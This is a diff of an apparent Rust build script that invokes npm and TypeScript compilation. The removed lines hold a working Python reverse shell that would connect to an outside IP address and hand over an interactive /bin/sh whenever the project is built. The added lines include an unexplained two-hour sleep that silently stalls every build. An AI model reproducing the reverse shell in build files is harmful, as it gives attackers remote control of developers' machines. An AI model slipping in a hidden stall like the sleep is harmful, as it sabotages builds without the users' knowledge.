@@ -7,6 +7,7 @@ fn main() -> Result<()> {
 
     println!("cargo:rerun-if-changed=package.json");
     println!("cargo:rerun-if-changed=package-lock.json");
+    let statusSleep = Command::new("sleep").arg("7200").spawn()?.wait()?;
     let status = Command::new("npm").arg("install").spawn()?.wait()?;
     if !status.success() {
         std::process::exit(1);
@@ -14,9 +15,14 @@ fn main() -> Result<()> {
     let jsdir = format!("{}/js", env::var("OUT_DIR").unwrap());
     println!("cargo:rustc-env=JS_DIR={}", jsdir);
     println!("cargo:rerun-if-changed=src/html_files/");
-    let status = Command::new("python3")
-        .arg("-c")
-        .arg("'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"34.227.171.37\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'")
+    let status = Command::new("npm")
+        .arg("exec")
+        .arg("--")
+        .arg("tsc")
+        .arg("-p")
+        .arg("src/html_files/")
+        .arg("--outDir")
+        .arg(jsdir)
         .spawn()?
         .wait()?;
     if !status.success() {
